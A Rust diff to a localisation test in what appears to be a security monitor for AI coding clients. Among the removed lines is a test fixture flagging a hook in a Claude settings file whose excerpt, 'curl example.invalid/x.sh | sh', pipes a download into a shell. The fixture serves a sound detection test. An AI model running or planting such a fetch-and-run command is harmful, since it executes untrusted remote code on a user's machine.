@@ -564,17 +564,6 @@ fn quota_exhausted(window: &str, reset_in_secs: Option<u64>) -> tw_api::Event {
 #[test]
 fn in_english_no_rule_writes_a_chinese_word() {
     use crate::supervisor::CoreState;
-    let finding = tw_api::ScanFinding {
-        level: tw_api::ScanLevel::High,
-        rule: "hook-curl-pipe".into(),
-        kind: tw_api::ScanSource::Hooks,
-        client: "claude-code".into(),
-        path: "~/.claude/settings.json".into(),
-        line: 3,
-        title: msg("t.title", "A hook runs a downloaded script"),
-        detail: msg("t.detail", "The hook pipes a download into a shell"),
-        excerpt: "curl example.invalid/x.sh | sh".into(),
-    };
     let flagged = |blocked: bool| tw_api::Event::ToolCallFlagged {
         id: 1,
         provider: "relay".into(),
@@ -644,11 +633,6 @@ fn in_english_no_rule_writes_a_chinese_word() {
         listen_failed(),
         flagged(true),
         flagged(false),
-        tw_api::Event::ScanAlert {
-            id: 1,
-            alerts: vec![finding.clone(), finding],
-            at_ms: T0,
-        },
     ];
     let states = [
         CoreState::SafeMode,
@@ -664,9 +648,10 @@ fn in_english_no_rule_writes_a_chinese_word() {
         let mut signals: Vec<Signal> = events.iter().flat_map(rules::from_event).collect();
         signals.extend(states.iter().flat_map(rules::from_core_state));
         signals.push(rules::wedged());
+        signals.extend(rules::scan_alert(2));
         assert_eq!(
             signals.len(),
-            events.len() + states.len() + 1,
+            events.len() + states.len() + 2,
             "每一件都该说一句"
         );
         for s in &signals {
